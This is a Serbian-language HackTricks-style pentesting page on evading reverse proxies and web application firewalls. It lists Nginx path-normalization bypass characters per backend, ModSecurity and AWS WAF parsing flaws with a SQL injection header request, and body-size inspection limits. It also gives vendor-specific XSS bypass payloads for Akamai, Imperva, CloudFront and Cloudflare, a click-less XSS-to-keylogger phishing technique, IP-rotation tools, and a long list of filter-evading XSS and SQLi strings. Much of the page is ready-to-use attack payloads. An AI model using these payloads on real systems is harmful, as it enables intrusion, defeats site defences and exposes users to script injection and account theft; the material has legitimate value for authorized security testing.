# Zaobilaženje Proxy / WAF zaštita

{{#include ../banners/hacktricks-training.md}}


## Zaobilaženje Nginx ACL Rules sa Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Tehnike [iz ovog istraživanja](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Primer Nginx pravila:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Da bi sprečio zaobilaženja, Nginx izvodi normalizaciju putanje pre nego što je proveri. Međutim, ako backend server izvrši drugačiju normalizaciju (uklanjajući karaktere koje Nginx ne uklanja), može biti moguće zaobići ovu odbranu.

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM konfiguracija:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx je konfigurisan da blokira pristup `/admin.php`, ali je moguće to zaobići pristupom `/admin.php/index.php`.

### Kako to sprečiti
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) objašnjeno je da je ModSecurity v3 (do 3.0.12) **pogrešno implementirao varijablu `REQUEST_FILENAME`** koja je trebalo da sadrži pristupnu putanju (do početka parametara). To je zato što je vršio dekodiranje URL-a da bi dobio putanju.\
Dakle, zahtev kao `http://example.com/foo%3f';alert(1);foo=` će u ModSecurity-ju biti shvaćen da je putanja samo `/foo` zato što se `%3f` transformiše u `?` i završava URL putanju, ali zapravo putanja koju server prima biće `/foo%3f';alert(1);foo=`.

Varijable `REQUEST_BASENAME` i `PATH_INFO` su takođe bile pogođene ovim bagom.

Nešto slično se desilo u verziji 2 Mod Security, što je omogućilo zaobilaženje zaštite koja je sprečavala korisnika da pristupi fajlovima sa određenim ekstenzijama vezanim za backup (kao što je `.bak`) jednostavno slanjem tačke URL-enkodovane kao `%2e`, na primer: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) pominje da je bilo moguće zaobići AWS WAF pravila primenjena na HTTP zaglavlja slanjem "malformed" zaglavlja koje AWS nije pravilno parsirao, dok ga je backend server prihvatao.

For example, sending the following request with a SQL injection in the header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Bilo je moguće zaobići AWS WAF zato što on nije razumeo da je naredni red deo vrednosti header-a, dok je NODEJS server to razumeo (ovo je ispravljeno).

## Generički WAF bypasses

### Request Size Limits

Obično WAF-ovi imaju određeno ograničenje dužine zahteva koje proveravaju, i ako je POST/PUT/PATCH zahtev veći od toga, WAF neće proveriti zahtev.

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maksimalna veličina tela web zahteva koja može biti pregledana za Application Load Balancer i AWS AppSync zaštite</td><td>8 KB</td></tr><tr><td>Maksimalna veličina tela web zahteva koja može biti pregledana za CloudFront, API Gateway, Amazon Cognito, App Runner, i Verified Access zaštite**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Stariji Web Application Firewalls sa Core Rule Set 3.1 (ili nižim) dozvoljavaju poruke veće od **128 KB** isključivanjem inspekcije tela zahteva, ali te poruke neće biti proveravane na ranjivosti. Za novije verzije (Core Rule Set 3.2 ili novije), isto se može postići onemogućavanjem maksimalnog ograničenja veličine tela zahteva. Kada zahtev premaši limit:

Ako je u p**revention mode**: Beleži i blokira zahtev.\
Ako je u **detection mode**: Pregleda do limita, ignoriše ostatak, i evidentira ako `Content-Length` premašuje limit.

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Po defaultu, WAF pregleda samo prvih 8KB zahteva. Limit se može povećati do 128KB dodavanjem Advanced Metadata.

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Do 128KB.

### Static assets inspection gaps (.js GETs)

Neke CDN/WAF konfiguracije primenjuju slabu ili nikakvu inspekciju sadržaja za GET zahteve za statičke resurse (na primer putanje koje se završavaju sa `.js`), dok i dalje primenjuju globalna pravila kao što su rate limiting i IP reputation. U kombinaciji sa automatskim keširanjem statičkih ekstenzija, ovo se može zloupotrebiti za isporuku ili ubacivanje malicioznih varijanti koje utiču na naknadne HTML odgovore.

Praktični slučajevi upotrebe:

- Pošaljite payload-e u nepouzdanim header-ima (npr. `User-Agent`) na GET prema `.js` putanji da izbegnete inspekciju sadržaja, zatim odmah zatražite glavni HTML da biste uticali na keširanu varijantu.
- Koristite svež/čist IP; kada je IP označen, promene u rutiranju mogu učiniti tehniku nepouzdanom.
- U Burp Repeater-u koristite "Send group in parallel" (single-packet style) da takmičite dva zahteva (`.js` pa HTML) kroz isti front-end put.

Ovo se dobro kombinuje sa header-reflection cache poisoning. Vidi:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Obfuskacija <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode kompatibilnost <a href="#unicode-compatability" id="unicode-compatability"></a>

U zavisnosti od implementacije Unicode normalizacije (više informacija [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), karakteri koji dele Unicode kompatibilnost mogu biti u stanju da zaobiđu WAF i izvrše se kao predviđeni payload. Kompatibilni karakteri se mogu naći [here](https://www.compart.com/en/unicode).

#### Primer <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Zaobilaženje kontekstualnih WAF-ova pomoću enkodiranja <a href="#ip-rotation" id="ip-rotation"></a>

Kao što je pomenuto u [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), da bismo zaobišli WAF-ove koji mogu da održe kontekst korisničkog unosa, možemo zloupotrebiti tehnike WAF-a da zapravo normalizujemo korisnički unos.

Na primer, u postu se pominje da je **Akamai URL decoded a user input 10 times**. Stoga će nešto poput `<input/%2525252525252525253e/onfocus` Akamai videti kao `<input/>/onfocus` što **može delovati kao da je tag zatvoren**. Međutim, sve dok aplikacija sama ne izvrši URL decode 10 puta, žrtva će videti nešto poput `<input/%25252525252525253e/onfocus` što je **i dalje validno za XSS napad**.

Dakle, ovo omogućava da **sakrijemo payload-ove u enkodiranim komponentama** koje će WAF dekodirati i interpretirati, dok žrtva neće.

Štaviše, ovo se može raditi ne samo sa URL enkodiranim payload-ovima već i sa drugim enkodiranjima kao što su unicode, hex, octal...

U postu su predloženi sledeći konačni bypass-ovi:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Takođe se pominje da, u zavisnosti od **kako neki WAF-ovi razumeju kontekst** korisničkog unosa, može biti moguće i to zloupotrebiti. Predloženi primer u blogu je da je Akamai dozvoljavao stavljanje bilo čega između `/*` i `*/` (potencijalno zato što se ovo često koristi kao komentar). Dakle, SQL injection kao `/*'or sleep(5)-- -*/` neće biti uhvaćen i biće validan jer je `/*` početni string injekcije, a `*/` je komentarisano.

Ovakvi problemi konteksta se takođe mogu iskoristiti za **zloupotrebu drugih ranjivosti osim one koju WAF očekuje** (npr. ovo se može koristiti i za eksploatisanje XSS-a).

### Inline JavaScript first-statement inspection gaps

Neki ruleseti za inline inspekciju parsiraju samo prvi JavaScript iskaz unutar event handler-a. Prefiksiranjem bezopasnog izraza u zagradama praćenog tačkom-zarezom (na primer `onfocus="(history.length);payload"`), maliciozni kod koji se nalazi posle tačke-zareza zaobilazi inspekciju dok ga browser i dalje izvršava. Kombinovanje ovoga sa fokusom izazvanim fragmentom (npr. dodavanjem `#forgot_btn` tako da ciljani element dobije fokus pri učitavanju) omogućava click-less XSS koji može odmah pozvati `$.getScript` i pokrenuti phishing alate kao što su keylogger-i. Pogledajte [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs) izvedeno iz [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generiše API gateway URL koji se koristi sa ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Slično fireprox-u
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin koji koristi API gateway IP adrese
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Dinamički određeni broj container instances se aktivira na osnovu veličine input fajla i split faktora; ulaz se deli na chunk-ove za paralelno izvršavanje — na primer 100 instanci obrađuje 100 chunk-ova iz input fajla od 10.000 linija sa split factor-om od 100 linija.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Različite tehnike se mogu koristiti za zaobilaženje regex filtera na firewall-ovima. Primeri uključuju menjanje velikih i malih slova, dodavanje preloma linije i enkodiranje payload-ova. Resursi za različite bypass metode mogu se naći na [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) i [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Primeri ispod su preuzeti iz [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Alati

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp plugin koji dodaje besmislene podatke u zahteve kako bi zaobišao WAF-ove na osnovu dužine

## Reference

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
